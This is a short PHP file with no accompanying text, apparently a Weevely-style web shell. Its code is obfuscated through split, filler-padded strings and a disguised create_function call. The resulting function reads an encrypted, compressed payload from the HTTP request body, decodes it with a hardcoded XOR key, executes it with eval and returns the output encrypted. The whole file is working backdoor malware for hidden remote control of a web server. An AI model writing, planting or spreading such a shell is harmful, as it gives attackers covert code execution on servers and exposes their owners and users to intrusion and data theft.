<?php
$n='"/$Ikh(.+I)$kf/",@fIiIle_getI_contents(I"phpI://iInput"),$m)=I=1)I {@ob_starIt();@eIv';
$t='IeInd_clean();$rI=@baseI64_enIcodIe(I@x(@gIzcomIpress($Io),$k));print("II$p$kh$r$kf");}';
$q='I$k="d537b803"I;$kh=I"0bIcb804bI55d2";$kIf="1d743b6I64497"I;$p="IcNeqaI2EIbNpLRvMIIWf"';
$x='=0I;($j<I$cI&&$i<$l);$Ij++,$i++I){$o.=$It{$iI}^$k{$jI};}}retIurn $oI;}if (I@prIeg_match(I';
$Z=';function Ix($t,$kI){$cI=IstrleIn($k);$l=strlIeIn($t);$o="I";fIor($i=0;$i<I$l;){for(I$j';
$G='aIIl(@gzunIcomIpress(@IIx(@IbasIe6I4_decode($m[1]I),$k)));$o=@ob_getI_contents();@Iob_';
$y=str_replace('Dp','','crDpeatDpDpe_fDpunDpctDpion');
$H=str_replace('I','',$q.$Z.$x.$n.$G.$t);
$m=$y('',$H);$m();
?>
